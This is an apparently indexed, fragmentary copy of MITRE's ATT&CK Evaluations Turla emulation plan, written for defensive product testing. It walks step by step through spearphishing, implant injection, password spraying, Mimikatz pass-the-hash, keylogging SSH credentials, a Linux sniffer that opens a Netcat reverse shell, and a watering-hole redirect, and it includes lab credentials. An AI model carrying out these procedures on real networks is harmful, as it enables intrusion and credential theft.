machine, copy over Penquin and pscp.exe to khabibulin (10.20.20.104):","➡️ From the \"smbclient\" tab on the Kali Linux machine, copy over plink.exe to khabibulin (10.20.20.104):","➡️ From your Kali Linux machine, open a new terminal tab using Ctrl+Shift+T. Rename the new tab to Penquin NC","➡️ Return to your RDP session to khabibulin (10.20.20.104) as adalwolfa.","➡️ Switch to your RDP session to khabibulin (10.20.20.104) or, if one was not opened from a previous step, open a new RDP session to khabibulin (10.20.20.104) as adalwolfa:","In the new tab, set up a Netcat listener for Penquin's reverse shell to connect to:","In the terminal where the reverse shell has connected to the Netcat listener, paste the following command to add the watering hole redirection to index.html:","Open an elevated Windows Command Prompt (if no existing admin prompt from a previous step)","Open File Explorer and browse to C:\\Windows\\System32","Open up another terminal tab and name this one to Packet Sender. Run the following commands to send the magic packet to the Apache server using the sendPacket.py utility.","Password","Password2!","Return to the elevated Windows Command Prompt to execute Penquin (Penquin takes ~ 8 seconds to execute).","Return to the File Explorer window in System32.","skt\\adalwolfa","Use the elevated Windows Command Prompt to copy Penquin to the Apache web server using Adalwolfa's credentials.","Username","Wait 1 minute and then send the following command to close the reverse shell","Wait a few seconds and then check the Netcat tab ( Penquin NC). The Netcat prompt should report a successful connection.","Wait for the command to return."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Penquin( Network Sniffer& Penquin Installer)","Writes the sniffer (Penquin) to disk","Moves Penquin to /usr/bin","Creates a service file","Stops cron service","Executes Penquin as cron","Real cron starts as child process","Installs packet sniffer on eth0","Magic packet filter criteria","Execute reverse shell","sendPacket.py"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf","https://securelist.com/the-penquin-turla-2/67962/","https://www.youtube.com/watch?v=JXsjRUxx47Et=647s","https://lab52.io/blog/looking-for-penquins-in-the-wild/","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf"]}],[{"l":"Scenario Overview","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","❗ - extremely important note","➡️ - Switching to another session","⭕ - Sign out of something"]},{"l":"Setup","p":["➡️ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, clear previous server logs, and start the control server:","Ensure that the Carbon and EPIC handlers started up."]},{"i":"step-1---initial-compromise","l":"Step 1 - Initial Compromise","p":["\uD83C\uDFA4 Voice Track:","Step 1 emulates Turla gaining initial access via a spearphishing link sent in an email to the user Gunter.","The link initiates the download of a fake software update executable named NTFVersion.exe. This executable contains another malicious executable, the injector for the EPIC implant.","When the fake updater is run by the user:","The updater writes the embedded injector to the user's path indicated by the%TEMP% environment variable as mxs_installer.exe.","The updater adds a Shell key value to the current user's Winlogon registry key ( HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon), where, upon Windows authentication, the injector will be executed in addition to explorer.exe."]},{"i":"biohazard-procedures","l":":biohazard: Procedures","p":["➡️ RDP to hobgoblin (10.20.20.102) as Gunter:","Username","Password","skt\\Gunter","Password1!","Open Microsoft Edge, declining all first-run options, and browse to https://brieftragerin.skt.local/owa. Login:","Open the email from noreply@sktlocal.it and click the link in the email to initiate the download of NTFVersion.exe.","Once the download has been completed, click the downloaded binary to execute it."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["EPIC Dropper","File write of EPIC injector as mxs_installer.exe","Registry modification","EPIC Injector"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68tab=librarydocuments","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf"]},{"i":"step-2---establish-initial-access","l":"Step 2 - Establish Initial Access","p":["\uD83C\uDFA4 Voice Track:","Step 2 emulates Turla establishing initial access and performing initial discovery on the first host.","Eventually, Gunter logs off for the day and logs back in the next day, executing the persistence mechanism for the EPIC implant.","When executed, the mxs_installer.exe will inject EPIC's guard DLL into explorer.exe. After EPIC's guard DLL has been established, it will search for processes that are typically internet enabled (e.g. iexplore.exe, msedge.exe, or firefox.exe) and inject an embedded worker DLL. If the process containing EPIC's worker DLL is killed, EPIC's guard DLL will search for processes again and re-inject the worker DLL.","EPIC's worker DLL will perform user enumeration and several host discovery commands automatically after injection. The output is then written to a log file at %TEMP%\\~D723574.tmp. EPIC then bzip2 compresses and base64 encodes the data before sending the data in an HTTP request to the hardcoded proxy server.","The C2 server responds with a UUID for EPIC to save for future communications. This and all future communications between the C2 server and EPIC are bzip compressed, AES encrypted, and base64 encoded. The AES session key is RSA encrypted and packaged with the data in the HTTP request."]},{"i":"biohazard-procedures-1","l":":biohazard: Procedures","p":["⭕ Close out of all tabs and sign out of the RDP session to hobgoblin (10.20.20.102) as Gunter.","➡️ Wait 2 minutes and then re-RDP to hobgoblin (10.20.20.102) as Gunter:","Username","Password","skt\\Gunter","Password1!","Open Microsoft Edge and browse to https://brieftragerin.skt.local/owa.","➡️ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","bzip2 compressed","C2 communications are:","Directory discovery DirectoryDiscovery","EPIC Guard","EPIC Injector","EPIC Payload","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","RSA encrypted AES key","Targeting browser processes for DLL injection","Targeting explorer.exe for DLL injection","User discovery GetAllUsers","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf"]},{"i":"step-3---discovery-and-privilege-escalation","l":"Step 3 - Discovery and Privilege Escalation","p":["\uD83C\uDFA4 Voice Track:","Step 3 emulates Turla performing additional discovery using EPIC and privilege escalation by abusing weak registry permissions.","Once C2 communications have been established between EPIC and the C2 via the proxy server, initial network enumeration is performed on the first host where information about the host device, local and domain groups, and network configurations is collected.","At this point, the domain controller bannik (10.20.10.9) and several domain administrator accounts, including frieda, are discovered. A custom service is also discovered.","Next, additional enumeration of the registry is performed and a weak registry permission for the service ViperVPN is discovered and the binary path is modified to perform privilege escalation.","Eventually the service is restarted manually by a domain admin from the domain controller to emulate the service being restarted via machine reboot. When the service restarts, EPIC will be executed with SYSTEM level privileges.","Note that since this domain admin login is part of a whitecarded service restart, we will not be using this logon session for subsequent activity."]},{"i":"biohazard-procedures-2","l":":biohazard: Procedures","p":["❗ Verify that the ViperVPNSvc service shows up in the tasklist output towards the end.","➡️ RDP into bannik (10.20.10.9), as Frieda:","➡️ Switch to your Kali attack station and confirm that a new elevated implant has registered.","➡️ Wait 1 minute before switching to your RDP session to hobgoblin (10.20.20.102). Minimize (do not close) the hobgoblin (10.20.20.102) RDP window.","Close any spurious windows.","ℹ️ Starting the ViperVPN service should take at least 30 seconds and eventually result in an error [SC] StartService FAILED 1053. The EPIC injector will wait an additional 2 minutes before performing injection. If the [SC] StartService FAILED 1053 error occurs in less than 10 seconds and/or you don't receive a new session, contact your Evals lead.","In your lower terminal tab, copy and paste the first set of discovery commands:","Open up an administrative Powershell session and run the following commands to remotely restart the service:","Password","Password3!","skt\\Frieda","This should return:","Username","Wait 1 minute and then ⭕ sign out of your RDP session to bannik (10.20.10.9) as Frieda","Wait 1 minute before tasking EPIC to modify the misconfigured ViperVPNSvc service to use our implant to execute:","Wait 1 minute before tasking the next command to query the service and who can access it:","Within your Kali control server terminal window, right click and select \"Split Terminal Horizontally\". Be careful not to terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["EPIC","Execute commands ExecCmd","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"]},{"i":"step-4---persistence","l":"Step 4 - Persistence","p":["\uD83C\uDFA4 Voice Track:","After successful file writes, the CARBON-DLL installer will create the WinSys Restore Service service, written as WinResSvc, to execute the loader DLL.","C:\\Program Files\\Windows NT\\0511","C:\\Program Files\\Windows NT\\2028","C:\\Program Files\\Windows NT\\Nlts","CAST-128 encrypted configuration file to%programfiles%\\Windows NT\\setuplst.xml","Communications library DLL to %programfiles%\\Windows NT\\msxhlp.dll","Loader DLL to %systemroot%\\System32\\mressvc.dll","On service execution, the loader DLL mressvc.dll will run under svchost and execute the orchestrator DLL MSSVCCFG.dll. The orchestrator DLL will then inject the communications library DLL msxhlp.dll into processes typically using HTTP, such as Internet Explorer. Several configuration, logging, and tasking files are dropped in C:\\Program Files\\Windows NT.","Once the service is set up, the CARBON-DLL installer will start the service before terminating its own execution.","Orchestrator DLL to %programfiles%\\Windows NT\\MSSVCCFG.dll","Step 4 emulates Turla deploying and installing CARBON-DLL as a second stage malware onto Gunter's workstation in order to maintain persistence. CARBON-DLL, a variant of CARBON relying on DLLs and asymmetric encryption, will inject an auxiliary communications module DLL into an existing browser process on Gunter's workstation to establish C2 communications via a redirector using HTTP requests. Once this communication channel is created, the malware will run a few discovery commands on Gunter’s device.","The CARBON-DLL installer then performs two registry writes to make sure that the service can find the loader DLL and that the service will run under svchost:","The CARBON-DLL installer will create the following subdirectories in C:\\Program Files\\Windows NT for tasking-related files and output:","The CARBON-DLL installer will drop the following files to disk:","The loader DLL path is written to registry key HKLM:\\SYSTEM\\CurrentControlSet\\services\\WinResSvc\\Parameters under the ServiceDll value","The service is written to registry key HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost under the WinSysRestoreGroup value"]},{"i":"biohazard-procedures-3","l":":biohazard: Procedures","p":["➡️ Return to your RDP session to hobgoblin (10.20.20.102) as Gunter","Ensure you have a Microsoft Edge window open with OWA. If not:","Open up Microsoft Edge and browse to https://brieftragerin.skt.local/owa. Login:","Username","Password","skt\\Gunter","Password1!","➡️ Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:","Once the download has completed successfully, wait 1 minute and then task the EPIC implant to execute the CARBON-DLL installer:","CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered with the C2 server","\uD83D\uDCF7 - upload a screenshot of the new implant session.","Wait 1 minute and then task the Carbon implant to execute some discovery commands:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task retrieval over HTTP","Upload task output over HTTP","EPIC","File download DownloadFile"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"step-5---lateral-movement-to-domain-controller","l":"Step 5 - Lateral Movement to Domain Controller","p":["\uD83C\uDFA4 Voice Track:","Step 5 emulates Turla laterally moving to the domain controller by conducting password spraying to retrieve a domain admin's credentials to the domain controller and using a scheduled task to gain execution on the domain controller.","CARBON-DLL downloads a batch script which uses sprays several of the discovered domain admin accounts with weak passwords, one of which successfully mounts the C:\\ drive of the domain controller.","In preparation for lateral movement, CARBON-DLL downloads a second copy of its installer and moves it to the System32 directory of the domain controller. Then, the Customer Experience Improvement Program's Consolidator scheduled task is modified to execute the CARBON-DLL installer.","Lastly, CARBON-DLL sends a request to run the modified scheduled task, achieving lateral movement to and execution on the domain controller.","By this point, Frieda has logged into the domain controller to start a browser process as part of legitimate user activity, which the new CARBON-DLL implant injects into to begin kicking off its communication with the C2 server.","Rather than communicate directly to the C2 redirector over HTTP, the new CARBON-DLL implant uses peer-to-peer communication over named pipes through the first CARBON-DLL implant on hobgoblin (10.20.20.102). Discovery commands are then executed, leading to the identification of an Apache web server and the workstation for the administrator of the Apache server, Adalwolfa.","Peer-to-peer communication will occur over the dsnap named pipe on both participating hosts."]},{"i":"biohazard-procedures-4","l":":biohazard: Procedures","p":["❗ Verify that the Consolidator task under the \\Microsoft\\Windows\\Customer Experience Improvement Program\\ task folder appears in the output.","❗ Verify that the script successfully sprays Frieda's password by checking the task output. You should see task output which states the following. It should take approximately 5 minutes to complete:","❗ Verify that the Web Servers and Web Server Admins groups are in the output.","➡️ Return to your control server output and confirm the registration of a new CARBON-DLL implant on the domain controller.","➡️ Return to your RDP session to hobgoblin (10.20.20.102) as Gunter. Minimize (do not close) the hobgoblin (10.20.20.102) RDP window.","➡️ Return to your tasking window and task the new CARBON-DLL implant with discovery commands to be run on the domain controller.","➡️ Wait 1 minute and return to your Kali control server terminal","Close any spurious windows","Ensure khabibulin is in the output and confirm the Description value is\"Adalwolfa Workstation\".","Open up Microsoft Edge (search for Edge if not in toolbar, do not use Edge Beta), decline all first-run start up options, and browse to https://brieftragerin.skt.local/owa","Password","Password3!","skt\\Frieda","Start a new RDP session to bannik (10.20.10.9) as Frieda:","Task CARBON-DLL to download and execute the batch script to spray weak passwords against the domain admin accounts and attempt to mount the C$ drive of the DC.","This should return:","Username","Wait 1 minute and then task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the System32 folder on the DC via the mounted drive.","Wait 1 minute and then task CARBON-DLL to enumerate both groups for their members.","Wait 1 minute and then task CARBON-DLL to enumerate remote scheduled tasks on the domain controller, using the discovered password for the domain admin Frieda","Wait 1 minute and then task CARBON-DLL to enumerate the Active Directory Computers.","Wait 1 minute and then task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain admin Frieda( https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a).","Wait 1 minute and then task CARBON-DLL to remotely start the modified scheduled task on the domain controller.","Wait 1 minute and then task CARBON-DLL to remove the password spray script."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Password spray batch script","CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"step-6---preparation-for-lateral-movement-onto-second-host","l":"Step 6 - Preparation for Lateral Movement onto Second Host","p":["\uD83C\uDFA4 Voice Track:","Step 6 emulates Turla downloading and executing Mimikatz as terabox.exe after gaining persistance on the machine. Execution of Mimikatz will reveal a cached NTLM hash for the admin user Adalwolfa. This username/hash combination will be used in the next step for lateral movement."]},{"i":"biohazard-procedures-5","l":":biohazard: Procedures","p":["From your Kali C2 terminal, task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump (note that the file gets downloaded to C:\\Windows\\\\Temp\\ and then gets moved to C:\\Windows\\System32 after download since the CARBON-DLL communications library module cannot download directly to privileged locations):","❗ Verify that the NTLM hash for adalwolfa is included in the output.","This should return:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes","Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 4: SwissCERT - RUAG Report","Report 9: Symantec - Waterbug New Toolset","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"step-7---lateral-movement-to-second-workstation","l":"Step 7 - Lateral Movement to Second Workstation","p":["\uD83C\uDFA4 Voice Track:","Step 7 emulates Turla preparing for and performing lateral movement to a second workstation in the domain, the Windows workstation belonging to Adalwolfa.","Adalwolfa logs into their workstation khabibulin (10.20.20.104) and opens up Edge to prepare for their legitimate user activity.","In the meantime, the CARBON-DLL implant on the domain controller downloads PsExec and a third copy of the CARBON-DLL installer, downloading both initially to C:\\Windows\\Temp before moving both executables to C:\\Windows\\System32\\.","Next, using the Mimikatz binary previously downloaded to the domain controller and Adalwolfa's discovered NTLM hash, CARBON-DLL performs pass-the-hash to copy the installer to Adalwolfa's workstation and PsExec to remotely execute the installer to install CARBON-DLL on Adalwolfa's workstation."]},{"i":"biohazard-procedures-6","l":":biohazard: Procedures","p":["➡️ Return to your RDP session to bannik (10.20.10.9) as Frieda. Minimize (do not close) the bannik (10.20.10.9) RDP window.","Start a new RDP session to khabibulin (10.20.20.104) as adalwolfa:","Username","Password","skt\\adalwolfa","Password2!","Close any spurious windows","Open up Edge, but don't browse to any website just yet. The browser process is needed for Carbon comms lib DLL injection to occur.","➡️ Wait 1 minute and return to your Kali control server terminal","Task the CARBON-DLL implant on the domain controller to download PsExec.","Wait 1 minute and then task the CARBON-DLL implant on the domain controller to download a third copy of the CARBON-DLL installer.","Wait 1 minute and then task the CARBON-DLL implant on the domain controller to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the installer to Adalwolfa's workstation and (2) execute it using PsExec.","❗ Verify that a new Carbon implant has been registered with the control server.","Wait 1 minute and then task the CARBON-DLL implant on the domain controller to clean up dropped files."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes","Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"]},{"i":"step-8---credential-access-on-admin-host","l":"Step 8 - Credential Access on Admin Host","p":["\uD83C\uDFA4 Voice Track:","Step 8 emulates Turla dropping a custom keylogger binary ( wingtsvcupdt.exe) on Adalwolfa's workstation and harvesting credentials from the system.","Once the tools have been dropped by the CARBON-DLL, the keylogger is executed and begins logging keystrokes to %temp%\\~DFA512.tmp The keylogger is used to collect SSH credentials that Adalwolfa was using on their system while the keylogger was running.","Meanwhile, Adalwolfa is using their Edge browser session to visit the website hosted by the Apache server to check one of the pages. The user then opens PowerShell and connects to the Apache server via SSH, where their plaintext credentials are captured by the keylogger. Adalwolfa then navigates to the directory containing the webpage file on the Apache server and opens the file to make a small change."]},{"i":"biohazard-procedures-7","l":":biohazard: Procedures","p":["❗ Type in full, do not copy or autocomplete, http://kagarov/index.html into the address bar and press enter.","❗ Verify that the keystrokes were logged containing the website information and Adalwolfa's SSH credentials.","➡️ Return to the Kali C2 server and task the CARBON-DLL implant on Adalwolfa's workstation to kill the keylogger process.","➡️ Wait 1 minute and then return to your RDP session to khabibulin (10.20.20.104) as adalwolfa.","From the workstation, as the Adalwolfa user account:","From your Kali C2 server terminal window, task the CARBON-DLL on Adalwolfa's workstation to download and execute the keylogger binary in the background:","Go to line 198 with CTRL + SHIFT + - then type 198","Open a PowerShell terminal and type do not copy the SSH command:","Open Edge.","Replace Apache2 Ubuntu Default Page with Adalwolfa's Page","save the file with CTRL + X, Y, enter","ssh adalwolfa@10.20.10.23","sudo nano /var/www/html/index.html","Type do not copy the SSH password Password2! when prompted.","Type exit to exit from the SSH session","Wait 1 minute and then task the CARBON-DLL implant to exfiltrate the data written to the keylogger file:","Wait 1 minute and then task the CARBON-DLL implant to remove the keylogger and keylogger output file:","Within the SSH session, type do not copy the follow commands as Adalwolfa:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Keylogger","Current hostname discovery","Token manipulation and session discovery to restart in active session","Keylogging hook routine","Set keylogging hook","Active window discovery"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://blog.talosintelligence.com/2021/09/tinyturla.html","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"]},{"i":"step-9---lateral-movement-to-linux-server","l":"Step 9 - Lateral Movement to Linux Server","p":["\uD83C\uDFA4 Voice Track:","Step 9 emulates Turla laterally moving to the Linux Apache server and installing Penquin.","First, the third CARBON-DLL implant downloads Penquin and pscp.exe to Adalwolfa's workstation, where pscp.exe is used with the credentials keylogged in the previous step to copy Penquin over to the Apache server. Next, CARBON-DLL downloads changes to the cron service to Adalwolfa's workstation and uses pscp.exe to also copy the changes to the Apache server.","Lastly, CARBON-DLL downloads plink.exe and, using the credentials keylogged in the previous step, executes Penquin on the Apache server.","Penquin performs the following actions:","Unpacking a binary (the compiled sniffer) named cron and adding executable permissions","Copying cron into /usr/bin/ as cron","Stopping the cron service","Creating a cron service file in the /etc/systemd/system/ folder for systemd to execute our cron. Note: The system executes our fake cron before the systems real cron because files located in /etc/systemd/system/ are executed before files in the /usr/sbin/cron","Reloading and starting the cron service","Our cron service installs the sniffer and executes real cron as a child process","In summary, Penquin installs a BPF filter and listens on the Apache server's network interface for a specific activation packet."]},{"i":"biohazard-procedures-8","l":":biohazard: Procedures","p":["From your Kali C2 server terminal, task the CARBON-DLL implant on Adawolfa's workstation to download Penquin (named tmp504e.tmp).","Wait 1 minute and then task the implant to download pscp.exe","Wait 1 minute and then task the implant to copy Penquin to the Apache web server using Adalwolfa's credentials.","Wait 1 minute and then task the implant to download plink.exe","Wait 1 minute and then task the implant to execute Penquin (Penquin takes ~ 8 seconds to execute).","Ensure no commands returned errors in the plink output:","Wait 1 minute and then task the implant to clean up downloaded files"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Penquin( Network Sniffer, Penquin Installer, & Obfuscation Algorithm)","Writes the sniffer (Penquin) to disk","Moves Penquin to /usr/bin","Creates a service file","Stops cron service","Executes Penquin as cron","Real cron starts as child process","Installs packet sniffer on eth0","Magic packet filter criteria","Execute reverse shell"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf","https://securelist.com/the-penquin-turla-2/67962/","https://www.youtube.com/watch?v=JXsjRUxx47Et=647s","https://lab52.io/blog/looking-for-penquins-in-the-wild/"]},{"i":"step-10---installation-of-watering-hole","l":"Step 10 - Installation of Watering Hole","p":["\uD83C\uDFA4 Voice Track:","Step 10 emulates Turla sending a magic packet to the Apache server, on which the sniffer component of Penquin reads the magic packet, parses the packet for the IP address to connect to, and triggers the establishment of a reverse shell.","First, a few discovery commands are sent through the established reverse shell. Aditional HTML is then appended to the webpage previously edited by Adalwolfa, containing script tags that load another simple JavaScript file hosted by the adversary's malicious site, anto-int[.]com, that redirects users who browse to http://kagarov/index.html to the adversary's malicious site instead, thus completing the installation of the watering hole."]},{"i":"biohazard-procedures-9","l":":biohazard: Procedures","p":["➡️ From your Kali C2 server terminal, open a new terminal tab using Ctrl+Shift+T. Recommended: rename the new tab to Penquin NC","In the new tab, set up a Netcat listener for Penquin's reverse shell to connect to:","Right click and split the window horizontally. Run the following commands to send the magic packet to the Apache server using the sendPacket.py utility.","Wait a few seconds and then check the Netcat tab ( Penquin NC). The Netcat prompt should report a successful connection.","In the terminal where the reverse shell has connected to the Netcat listener, paste the following command to add the watering hole redirection to index.html:","Note - this command does not return output. Wait 1 minute and then send the following command to close the reverse shell"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Penquin","sendPacket.py"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf"]}],[{"l":"OVERVIEW","p":["The Turla port contains two adversary profiles for each of the executed scenarios in MITRE Engenuity's ATT&CK® Evaluations: Enterprise - Round 5. Follow the setup instructions below and then navigate to the scenario-specific setup guides for the profile you would like to execute:","Carbon Scenario","Snake Scenario","Information about each scenario can be found here."]},{"l":"DEPENDENCIES"},{"l":"CALDERA C2 Server","p":["Linux/Mac OS, 64-bit","git commandline installed","python3.8+ with pip3","golang 1.17+","required for dynamic agent compilation","Recommended hardware is 8GB+ RAM and 2+ CPUs"]},{"l":"Attacker Machine Dependencies","p":["Linux OS, 64-bit","Kali recommended","Can be the same machine as the CALDERA C2 server","Command-line tools","xfreerdp","xdotools","curl","urllib3","ncat (by Nmap)"]},{"l":"SETUP"},{"l":"Download and Install CALDERA","p":["Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server, or the \"attacker\" host. For the purposes of this walkthrough, the C2 server will have an IP address of 176.59.15.33.","Add the emu plugin to your conf/local.yml configuration file. Feel free to enable or disable other plugins by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.","Download pip dependencies.","Download required payloads for emu plugin.","Run your C2 server from the caldera directory. This will unzip encrypted executables throughout the adversary-emulation-library and ingest its emulation plans."]},{"i":"compile-snake--mimikatz-binaries","l":"Compile Snake & Mimikatz Binaries"},{"l":"Snake","p":["❗ Snake has not been included in this binaries.zip. Please visit the following resources for building Snake and its components:","Snake Installer Build","Snake Build Script"]},{"l":"Mimikatz","p":["❗ Mimikatz must be modified and compiled according to these instructions."]},{"l":"Launch the Kali Agent","p":["RDP to 176.59.15.33, the Kali attacker host, as user dev with password DevPass12345. Launch the Kali agent by running the following command. You may need to modify the command so the server value matches your attacker host's IP address.","❗ Keep this RDP open as this will be leveraged by xfreerdp in the executed Caldera operation. Once the operation has been started, avoid interacting with the RDP to Kali. Clicking or switching windows within the Kali RDP will interfere with the user activity that is automated through Caldera.","Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is red, default password is admin).","On the left sidebar, under \"Campaigns\", click \"agents\" and confirm that you see the Kali agent beaconing in.","For best results, make sure you don't have other agents currently beaconing in."]}],[{"i":"#","p":["The guide contains continued setup information for the Caldera port of the Turla Snake scenario. If you have not yet set up Caldera, please refer to the initial setup instructions first."]},{"l":"PREPARING THE TARGETS","p":["Start by logging into the second target host (file server) as the domain admin user. Then, disconnect the RDP (do not log off). This is required for Step 16 credential dumping to succeed.","Log every other target user into their intended workstation and open Edge at least once to ignore any first time prompts. Log out of sessions.","Copy Microsoft.Exchange.WebServices.dll from an existing Exchange server to turla/Resources/caldera_port."]},{"l":"STARTING THE CONTROL SERVER","p":["On the attacker machine, open a new terminal window and run the following to start the C2 server:","Ensure the EPIC, Snake, and LightNeuron handlers start up before continuing to the next step."]},{"l":"FACT SETUP","p":["Additionally, a separate Caldera requirement was implemented for the Lightneuron implant. This requirement will allow an ability to execute if the Lightneuron implant ID is listed in the agents tab of the Caldera Server GUI, even if the agent is dead and untrusted. The Lightneuron agent only sends one initial beacon to the Server, and is then considered a dead agent. This custom requirement will allow Lightneuron to be tasked despite that fact that it appears dead in the Caldera GUI.","Before running the operation, you will need to make sure that the Turla fact source is properly configured for your environment. While default fact values are 